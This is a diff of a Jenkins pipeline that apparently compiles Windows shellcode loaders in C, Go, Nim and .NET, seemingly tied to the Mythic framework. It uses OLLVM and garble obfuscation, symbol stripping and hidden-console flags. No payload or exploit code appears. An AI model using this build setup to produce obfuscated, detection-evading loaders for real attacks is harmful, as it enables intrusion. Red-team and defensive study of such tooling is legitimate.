@@ -45,38 +45,10 @@ pipeline {
             }
         }
 
-        stage('Build - C/MinGW') {
+        stage('Build - C') {
             when {
                 beforeAgent true
-                expression { params.LANGUAGE == 'c-mingw' }
-            }
-            agent {
-                docker {
-                    image 'maas-builder-c'
-                    label 'linux-c'
-                    args '-v /payloads:/payloads'
-                }
-            }
-            steps {
-                unstash 'source'
-                script { if (params.MYTHIC_PAYLOAD_UUID?.trim()) { unstash 'shellcode' } }
-                sh """
-                    mkdir -p shellcode
-                    [ -f shellcode/payload.bin ] || printf '\\xcc' > shellcode/payload.bin
-                    x86_64-w64-mingw32-windres src/resource.rc -o resource.o
-                    x86_64-w64-mingw32-gcc -o loader.${params.OUTPUT_FORMAT == 'dll' ? 'dll' : 'exe'} \\
-                        src/main.c src/payload.c src/techniques/*.c resource.o \\
-                        -Isrc ${params.OUTPUT_FORMAT == 'dll' ? '-shared' : ''} \\
-                        -lntdll -lkernel32 -mwindows -s -O2
-                """
-                stash includes: "loader.*", name: 'artifact'
-            }
-        }
-
-        stage('Build - C/OLLVM') {
-            when {
-                beforeAgent true
-                expression { params.LANGUAGE == 'c-ollvm' }
+                expression { params.LANGUAGE in ['c-mingw', 'c-ollvm'] }
             }
             agent {
                 docker {
@@ -93,34 +65,53 @@ pipeline {
                     [ -f shellcode/payload.bin ] || printf '\\xcc' > shellcode/payload.bin
                 """
                 script {
-                    def ollvmFlags = ''
-                    switch (params.OBFUSCATION) {
-                        case 'ollvm-cff':
-                            ollvmFlags = '-mllvm -fla'; break
-                        case 'ollvm-bcf-cff':
-                            ollvmFlags = '-mllvm -fla -mllvm -bcf'; break
-                        case 'ollvm-full':
-                            ollvmFlags = '-mllvm -fla -mllvm -bcf -mllvm -sub'; break
-                        case 'ollvm-heavy':
-                            ollvmFlags = '-mllvm -fla -mllvm -split -mllvm -bcf -mllvm -bcf_prob=100 -mllvm -bcf_loop=3 -mllvm -sub -mllvm -sub_loop=5'; break
-                        default:
-                            ollvmFlags = ''; break
+                    def ext = params.OUTPUT_FORMAT == 'dll' ? 'dll' : 'exe'
+                    def sharedFlag = params.OUTPUT_FORMAT == 'dll' ? '-shared' : ''
+
+                    // collect all .c sources under src/
+                    def sources = sh(script: "find src -name '*.c' | sort | tr '\\n' ' '", returnStdout: true).trim()
+
+                    // compile resource if present
+                    if (fileExists('src/resource.rc')) {
+                        sh "x86_64-w64-mingw32-windres src/resource.rc -o resource.o"
                     }
-                    sh """
-                        x86_64-w64-mingw32-windres src/resource.rc -o resource.o
-                        clang --target=x86_64-w64-mingw32 ${ollvmFlags} \\
-                            -c src/main.c src/payload.c src/ntapi.c src/techniques/*.c -Isrc -O1
-                        x86_64-w64-mingw32-gcc -o loader.${params.OUTPUT_FORMAT == 'dll' ? 'dll' : 'exe'} \\
-                            *.o resource.o \\
-                            ${params.OUTPUT_FORMAT == 'dll' ? '-shared' : ''} \\
-                            -lntdll -lkernel32 -s
-                    """
+                    def resObj = fileExists('src/resource.rc') ? 'resource.o' : ''
+
+                    if (params.LANGUAGE == 'c-ollvm') {
+                        def ollvmFlags = ''
+                        switch (params.OBFUSCATION) {
+                            case 'ollvm-cff':
+                                ollvmFlags = '-mllvm -fla'; break
+                            case 'ollvm-bcf-cff':
+                                ollvmFlags = '-mllvm -fla -mllvm -bcf'; break
+                            case 'ollvm-full':
+                                ollvmFlags = '-mllvm -fla -mllvm -bcf -mllvm -sub'; break
+                            case 'ollvm-heavy':
+                                ollvmFlags = '-mllvm -fla -mllvm -split -mllvm -bcf -mllvm -bcf_prob=100 -mllvm -bcf_loop=3 -mllvm -sub -mllvm -sub_loop=5'; break
+                            default:
+                                ollvmFlags = ''; break
+                        }
+                        sh """
+                            clang --target=x86_64-w64-mingw32 ${ollvmFlags} \\
+                                -c ${sources} -Isrc -O1
+                            x86_64-w64-mingw32-gcc -o loader.${ext} \\
+                                *.o ${resObj} ${sharedFlag} \\
+                                -lntdll -lkernel32 -s
+                        """
+                    } else {
+                        sh """
+                            x86_64-w64-mingw32-gcc -o loader.${ext} \\
+                                ${sources} ${resObj} \\
+                                -Isrc ${sharedFlag} \\
+                                -lntdll -lkernel32 -mwindows -s -O2
+                        """
+                    }
                 }
                 stash includes: "loader.*", name: 'artifact'
             }
         }
 
-        stage('Build - Go/Garble') {
+        stage('Build - Go') {
             when {
                 beforeAgent true
                 expression { params.LANGUAGE == 'go-garble' }
@@ -139,7 +130,7 @@ pipeline {
                     GOOS=windows GOARCH=amd64 \\
                     garble -literals -tiny build \\
                         -o loader.exe -ldflags="-s -w" \\
-                        ./cmd/loader
+                        ./...
                 """
                 stash includes: 'loader.exe', name: 'artifact'
             }
@@ -161,9 +152,10 @@ pipeline {
                 unstash 'source'
                 script { if (params.MYTHIC_PAYLOAD_UUID?.trim()) { unstash 'shellcode' } }
                 sh """
+                    NIM_MAIN=\$(find src -maxdepth 1 -name '*.nim' | head -1)
                     nim c -d:mingw -d:release -d:strip \\
                         --opt:size --app:gui \\
-                        -o:loader.exe src/loader.nim
+                        -o:loader.exe "\$NIM_MAIN"
                 """
                 stash includes: 'loader.exe', name: 'artifact'
             }
@@ -179,14 +171,16 @@ pipeline {
                 unstash 'source'
                 script { if (params.MYTHIC_PAYLOAD_UUID?.trim()) { unstash 'shellcode' } }
                 bat """
-                    dotnet publish src\\Loader.csproj ^
-                        -c Release -r win-x64 ^
-                        --self-contained true ^
-                        -p:PublishSingleFile=true ^
-                        -p:PublishTrimmed=true ^
-                        -o .
+                    for /R src %%f in (*.csproj) do (
+                        dotnet publish "%%f" ^
+                            -c Release -r win-x64 ^
+                            --self-contained true ^
+                            -p:PublishSingleFile=true ^
+                            -p:PublishTrimmed=true ^
+                            -o .
+                    )
                 """
-                stash includes: 'Loader.exe', name: 'artifact'
+                stash includes: '*.exe', name: 'artifact'
             }
         }
 
